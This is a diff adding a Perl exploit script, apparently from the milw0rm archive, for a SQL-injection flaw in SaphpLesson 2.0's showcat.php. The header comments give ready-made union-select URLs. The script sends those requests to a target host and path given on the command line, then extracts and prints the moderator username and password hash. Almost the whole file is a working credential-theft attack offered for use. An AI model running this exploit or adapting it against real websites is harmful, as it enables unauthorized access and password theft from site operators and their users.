@@ -1,0 +1,44 @@
+#!/usr/bin/perl
+#
+# For password
+# http://www.example.com/path/showcat.php?forumid=-1%20union%20select%20ModPassword%20from%20modretor
+# For username
+# http://www.example.com/path/showcat.php?forumid=-1%20union%20select%20ModName%20from%20modretor
+# sent in by SnIpEr_SA (selfar2002[at]hotmail.com)
+# ported by str0ke (milw0rm.com)
+
+use LWP::Simple;
+
+$serv     =  $ARGV[0];
+$path     =  $ARGV[1];
+
+sub usage
+ {
+    print "\nSaphpLesson 2.0 SQL-Injection \n";
+    print "By SnIpEr_SA Ported by str0ke\n";
+    print "Usage: $0 www.example.com /directory/\n";
+    print "sever    -  URL\n";
+    print "path     -  path to showcat.php\n";
+    exit ();
+}
+
+sub exploit
+ {
+    print qq(
+    SaphpLesson 2.0 SQL-Injection
+    By SnIpEr_SA Ported by str0ke\n\n);
+
+    $URL = sprintf("http://%s%sshowcat.php?forumid=-1+union+select+ModName+from+modretor",$serv,$path);
+    $content = get "$URL";
+    if ($content =~ /(\[)(.*)(\]\<\/title\>)/){&user;}else{print "No Workie\n";}
+    $URL = sprintf("http://%s%sshowcat.php?forumid=-1+union+select+ModPassword+from+modretor",$serv,$path);
+    $content = get "$URL";
+    if ($content =~ /(\[)(\w{32})(\]\<\/title\>)/){&showh;}else{print "No Workie\n";}
+}
+
+sub user { print "[*] Username: $2\n";}
+sub showh { print "[*] Hash: $2\n\n";}
+
+if (@ARGV != 2){&usage;}else{&exploit;}
+
+# milw0rm.com [2006-02-25]
